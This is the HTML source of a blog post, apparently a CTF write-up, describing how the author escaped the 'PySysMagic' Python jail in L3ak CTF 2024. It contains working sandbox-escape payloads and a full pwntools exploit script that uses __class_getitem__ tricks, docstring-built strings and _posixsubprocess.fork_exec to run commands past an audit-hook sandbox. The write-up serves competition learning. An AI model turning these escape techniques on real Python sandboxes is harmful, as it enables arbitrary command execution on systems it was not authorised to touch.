@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content="Personal blog on Cybersec &amp; other things."
+  />
+  
+    
+      <title>PySysMagic - L3ak CTF 2024 | Salvatore Abello&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="http://localhost:1313/">
+      <img
+        class="icon"
+        src="/images/brandIcon.svg"
+      />
+    </a>
+    <div class="text">
+      <a href="http://localhost:1313/"><h1>Salvatore Abello&#39;s Blog</h1></a>
+      <h3>Hacking &amp; other stuff</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/whoami/"><b>Whoami</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/cve/"><b>CVEs</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">PySysMagic - L3ak CTF 2024</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-08-25 23:38:20</time>
+    
+    
+  </strong>
+  <span> • 923 words</span>
+  <span> • 5 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/cybersec">Cybersec</a>, 
+        <a href="/tags/pyjail">pyjail</a>
+    </div>
+  
+</div>
+
+      <div class="content"><p>I partecipated to the first edition of <code>L3ak CTF</code> with <code>FoocHackz</code>. I solved this challenge, it wasn&rsquo;t hard but writing a working exploit took me at least one/two hours.</p>
+<h2 id="index">Index</h2>
+<ul>
+<li><a href="#index">Index</a></li>
+<li><a href="#overview">Overview</a>
+<ul>
+<li><a href="#source">Source</a></li>
+<li><a href="#a-bit-of-py-magic">A bit of Py-Magic</a></li>
+<li><a href="#obligatory-pyjail">Obligatory Pyjail</a></li>
+<li><a href="#building-payloads-from-docs">Building payloads from docs</a></li>
+</ul>
+</li>
+<li><a href="#solve">Solve</a>
+<ul>
+<li><a href="#flag">Flag</a></li>
+</ul>
+</li>
+<li><a href="#considerations">Considerations</a></li>
+<li><a href="#source">Source</a></li>
+</ul>
+<h2 id="overview">Overview</h2>
+<p>As the title of the challenge suggests, it&rsquo;s a pyjail. To be more precise, two challenges from two different CTFs were merged together</p>
+<ul>
+<li><code>obligatory pyjail</code> from <code>LIT CTF 2023</code></li>
+<li><code>PyMagic</code> from <code>TCP1P CTF 2023</code></li>
+</ul>
+<p>So, with that in mind, let&rsquo;s take a look at the source code</p>
+<h3 id="source">Source</h3>
+<p>We&rsquo;re given a bunch of files but these are the most important ones</p>
+<ul>
+<li><code>audit_sandbox.c</code> a C program which uses <a href="https://peps.python.org/pep-0578/">Audit Hooks</a> to implement a whitelist sandbox. The only audit events we&rsquo;re allowed to use are <code>compile</code> and <code>exec</code></li>
+<li><code>chall.py</code> the actual challenge script</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># python3.10 chall.py build</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># obligatory pyjail + PyMagic = ?</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> distutils.core <span style="color:#f92672">import</span> Extension, setup
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span> <span style="color:#75715e"># Useless stuff</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt;&gt;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> audit_sandbox
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>audit_sandbox<span style="color:#f92672">.</span>install_hook()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">del</span> audit_sandbox
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">del</span> sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#34;audit_sandbox&#34;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">del</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>  <span style="color:#75715e"># ill be nice :)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eval <span style="color:#f92672">=</span> eval
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;[()&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">0123456789 ]&#34;</span>, code):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> (b <span style="color:#f92672">:=</span> __builtins__<span style="color:#f92672">.</span>__dict__)<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>        b[k] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    eval(code, {<span style="color:#e6db74">&#34;__builtins__&#34;</span>: {}, <span style="color:#e6db74">&#34;_&#34;</span>: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz})
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Nope.&#34;</span>)
+</span></span></code></pre></div><p>A lot of things immediately catch the eye</p>
+<ul>
+<li>All builtin functions are <em>apparently</em> deleted except <code>eval</code> but can be accessed from the <code>__main__</code> module</li>
+<li><code>()</code> and numbers are not allowed</li>
+<li><code>'</code>, <code>&quot;</code> and <code>[space]</code> are not allowed</li>
+<li>A cool gadget called <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</code> is given to us</li>
+</ul>
+<p>If there had been <code>exec</code> instead of <code>eval</code>, we could have used <a href="https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-function-calls">decorators</a>!</p>
+<h3 id="a-bit-of-py-magic">A bit of Py-Magic</h3>
+<p>In this case, we can use a cool trick from the <code>PyMagic</code> challenge mentioned above</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call_function</span>(f, arg):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[[None for _.__class_getitem__ in [</span><span style="color:#e6db74">{</span>f<span style="color:#e6db74">}</span><span style="color:#e6db74">]],&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;_[</span><span style="color:#e6db74">{</span>arg<span style="color:#e6db74">}</span><span style="color:#e6db74">]][True]&#34;</span>)
+</span></span></code></pre></div><p>Thanks to <a href="https://peps.python.org/pep-0560/#class-getitem"><code>__class_getitem__</code></a> we&rsquo;re able to call any function without using brackets</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>    [
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">None</span> <span style="color:#66d9ef">for</span> _<span style="color:#f92672">.</span>__class_getitem__ <span style="color:#f92672">in</span> [int] <span style="color:#75715e"># Equivalent of _.__class_getitem__ = int</span>
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>    _[<span style="color:#e6db74">&#39;12&#39;</span>] <span style="color:#75715e"># Calling _.__class_getitem__ -&gt; int</span>
+</span></span><span style="display:flex;"><span>][<span style="color:#66d9ef">True</span>] <span style="color:#75715e"># Get the return value</span>
+</span></span></code></pre></div><p>But using this method, we have limitations: we are forced to pass only one argument to a function</p>
+<h3 id="obligatory-pyjail">Obligatory pyjail</h3>
+<p>Ok now we need to bypass the audit sandbox. The file called <code>audit_sandbox.c</code> was actually <del>stolen</del> taken from <code>LIT CTF 2023</code></p>
+<p>Let&rsquo;s just take a look the solve for <code>obligatory pyjail</code> (Credits to flocto)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>[lm<span style="color:#f92672">:=</span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">104</span>]<span style="color:#f92672">.</span>load_module,p<span style="color:#f92672">:=</span>__import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>pipe,_ps<span style="color:#f92672">:=</span>lm(<span style="color:#e6db74">&#34;_posixsubprocess&#34;</span>),_ps<span style="color:#f92672">.</span>fork_exec([<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/cat&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt&#34;</span>], [<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/cat&#34;</span>], <span style="color:#66d9ef">True</span>, (), <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">*</span>(p()), <span style="color:#66d9ef">False</span>, <span style="color:#66d9ef">False</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">None</span>)]
+</span></span></code></pre></div><p>So using <code>_posixsubprocess.fork_exec</code> we bypass that sandobx. Cool, but there&rsquo;s a catch: <code>fork_exec</code> requires exactly 21 arguments. As I said before, we&rsquo;re allowed to pass exactly 1 argument using <code>_.__class_getitem__</code></p>
+<p>And now what?</p>
+<h2 id="building-payloads-from-docs">Building payloads from docs</h2>
+<p>I specified earlier that <code>eval</code> is not completely deleted. In fact, we can access it from the <code>__main__</code> module. Since we can&rsquo;t import anything, we can reach the <code>sys</code> module from some objects found in <code>().__class__.__base__.__subclasses()</code> andd then access to <code>eval</code> using <code>sys.modules['__main__']</code></p>
+<p>But how can <code>eval</code> be useful to us?</p>
+<p>Our goal is to call <code>fork_exec</code> passing to it 21 arguments. We can build payloads from scratch using docs (eg. <code>[].__doc__</code>). If some characters are not in the docs, we can get them from <code>_.__qualname__</code></p>
+<p>So, our main idea would be:</p>
+<ul>
+<li>Build a payload from docs which would call <code>_posixsubprocess.fork_exec</code></li>
+<li>Reach <code>__main__.eval</code></li>
+<li>Call it and pass the payload as the first argument</li>
+<li>Profit</li>
+</ul>
+<h2 id="solve">Solve</h2>
+<p>I copy pasted the solve for <code>PyMagic</code>, you can find it <a href="https://github.com/SuperStormer/writeups/blob/master/tcp1pctf_2023/misc/pymagic/solve_pymagic.py">here</a> (Credits to SuperStormer)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_int</span>(i):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;False&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;--&#34;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#34;True&#34;</span>] <span style="color:#f92672">*</span> i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call_function</span>(f, arg):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[[None for _.__class_getitem__ in [</span><span style="color:#e6db74">{</span>f<span style="color:#e6db74">}</span><span style="color:#e6db74">]],&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;_[</span><span style="color:#e6db74">{</span>arg<span style="color:#e6db74">}</span><span style="color:#e6db74">]][True]&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>type_s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_.__class__&#34;</span>
+</span></span><span style="display:flex;"><span>object_s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_.__base__&#34;</span>
+</span></span><span style="display:flex;"><span>subclasses <span style="color:#f92672">=</span> call_function(type_s <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.__subclasses__&#34;</span>, object_s) <span style="color:#75715e"># _.__class__.__subclasses__(_.__base__)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wrap_close <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>subclasses<span style="color:#e6db74">}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{</span>gen_int(<span style="color:#ae81ff">137</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">]&#34;</span> <span style="color:#75715e"># os._wrap_close</span>
+</span></span><span style="display:flex;"><span>os_module <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>wrap_close<span style="color:#e6db74">}</span><span style="color:#e6db74">.__init__.__globals__&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span>:<span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_string</span>(string):
+</span></span><span style="display:flex;"><span>    src <span style="color:#f92672">=</span> []<span style="color:#f92672">.</span>__doc__<span style="color:#f92672">.</span>__doc__ <span style="color:#f92672">+</span> {}<span style="color:#f92672">.</span>__doc__
+</span></span><span style="display:flex;"><span>    final <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> string:
+</span></span><span style="display:flex;"><span>        fromdoc <span style="color:#f92672">=</span> (a<span style="color:#f92672">:=</span>src<span style="color:#f92672">.</span>find(x)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> fromdoc:
+</span></span><span style="display:flex;"><span>            final <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[[].__doc__.__doc__+</span><span style="color:#ae81ff">{{}}</span><span style="color:#e6db74">.__doc__][False][</span><span style="color:#e6db74">{</span>gen_int(a)<span style="color:#e6db74">}</span><span style="color:#e6db74">]+&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: final <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;_.__qualname__[</span><span style="color:#e6db74">{</span>gen_int(ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<span style="color:#f92672">.</span>__qualname__<span style="color:#f92672">.</span>find(x))<span style="color:#e6db74">}</span><span style="color:#e6db74">]+&#34;</span> <span style="color:#66d9ef">if</span> ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<span style="color:#f92672">.</span>__qualname__<span style="color:#f92672">.</span>find(x) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>call_function(<span style="color:#e6db74">&#39;_.__class__.__subclasses__&#39;</span>, <span style="color:#e6db74">&#39;_.__base__&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{</span>gen_int(<span style="color:#ae81ff">14</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].__doc__[True]+&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> final[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sys_s <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*</span><span style="color:#e6db74">{</span>os_module<span style="color:#e6db74">}</span><span style="color:#e6db74">][</span><span style="color:#e6db74">{</span>gen_int(<span style="color:#ae81ff">9</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">]&#34;</span>
+</span></span><span style="display:flex;"><span>sys_modules <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>os_module<span style="color:#e6db74">}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{</span>sys_s<span style="color:#e6db74">}</span><span style="color:#e6db74">].modules&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main_module_s <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*</span><span style="color:#e6db74">{</span>sys_modules<span style="color:#e6db74">}</span><span style="color:#e6db74">][</span><span style="color:#e6db74">{</span>gen_int(<span style="color:#ae81ff">22</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">]&#34;</span>
+</span></span><span style="display:flex;"><span>eval_func <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>sys_modules<span style="color:#e6db74">}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{</span>main_module_s<span style="color:#e6db74">}</span><span style="color:#e6db74">].eval&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>to_eval <span style="color:#f92672">=</span> build_string(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[(os_module:=().__class__.__base__.__subclasses__()[</span><span style="color:#e6db74">{</span>gen_int(<span style="color:#ae81ff">137</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].__init__.__globals__).__class__,(sys:=os_module[&#39;sys&#39;]).__class__,sys.modules[&#39;_posixsubprocess&#39;].fork_exec([f&#39;.</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">readflag&#39;.encode()],[f&#39;.</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">readflag&#39;.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module[&#39;pipe&#39;]()),False,False,None,None,None,-True,None)]&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system_sh <span style="color:#f92672">=</span> call_function(eval_func, to_eval)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;34.139.98.117&#34;</span>, <span style="color:#ae81ff">6669</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(system_sh)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Let&rsquo;s break it down</p>
+<ul>
+<li><code>gen_int</code> Since numbers cannot be used, they can be generated from booleans (eg. <code>3</code> becomes <code>True -- True -- True</code>). I used <code>--</code> instead of <code>+</code> because I couldn&rsquo;t find <code>+</code> inside the docs</li>
+<li><code>build_string</code> <code>&quot;</code> and <code>'</code> are not allowed so it&rsquo;s possible to build the payload from docs and from <code>_.__qualname__</code></li>
+<li><code>call_function</code> generate the payload to call a specified function with an argument</li>
+<li><code>subclasses</code> is the equivalent of <code>_.__class__.__subclasses__(_.__base__)</code>, which is the equivalent of <code>_.__class__.__base__.__subclasses__()</code></li>
+<li>Access <code>os._wrap_close</code> (position 137) to recover the <code>os</code> module objects</li>
+<li>Do the same thing for the <code>sys</code> module and then recover <code>__main__.eval</code></li>
+<li>Build the payload which will be passed to <code>eval</code>: <code>[(os_module:=().__class__.__base__.__subclasses__()[137].__init__.__globals__).__class__,(sys:=os_module['sys']).__class__,sys.modules['_posixsubprocess'].fork_exec([f'.{47:c}readflag'.encode()],[f'.{47:c}readflag'.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module['pipe']()),False,False,None,None,None,-True,None)]</code></li>
+<li>Finally, pass that payload to <code>eval</code> and proceed to send everything to the remote server</li>
+</ul>
+<h3 id="flag">Flag</h3>
+<p><code>L3AK{ok_so_os_wrap_close_works_with_builtin_removal_so_added_audit_sandbox_lol_689db2}</code></p>
+<h2 id="considerations">Considerations</h2>
+<p>This is not the intended solution. The author forgot to remove <code>eval</code> from the main module. I think the intended one is a lot smaller than mine.</p>
+<p>What happens if all modules from <code>sys.modules</code> are removed? Is it still solvable?</p>
+<p>At the end, it was a fun challenge to solve ❤️</p>
+<p>Thanks to the authors for the challenge and for the CTF in general. It&rsquo;s always nice to see pyjails in CTFs!</p>
+<h2 id="source-1">Source</h2>
+<p>You can find the source of this challenge <a href="https://github.com/salvatore-abello/pyjail/tree/main/L3ak%20CTF%202024">here</a></p>
+<p><strong>P.S:</strong> Do you need a cheatsheet with many tricks to solve pyjails? If so, <a href="https://github.com/salvatore-abello/python-ctf-cheatsheet/">click here!</a></p>
+</div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/salvatore-abello">Github</a>
+      
+         | 
+        <a href="https://www.linkedin.com/in/salvatore-abello-411b64252/">Linkedin</a>
+      
+         | 
+        <a href="https://www.instagram.com/salvatore.abello/">Instagram</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright 2024. All rights reserved.
+    <hr />
+    <code>Made with ❤️ by <strong>Salvatore Abello</strong></code>.
+  </p>
+</footer>
+
+    </div>
+  </body>
+</html>
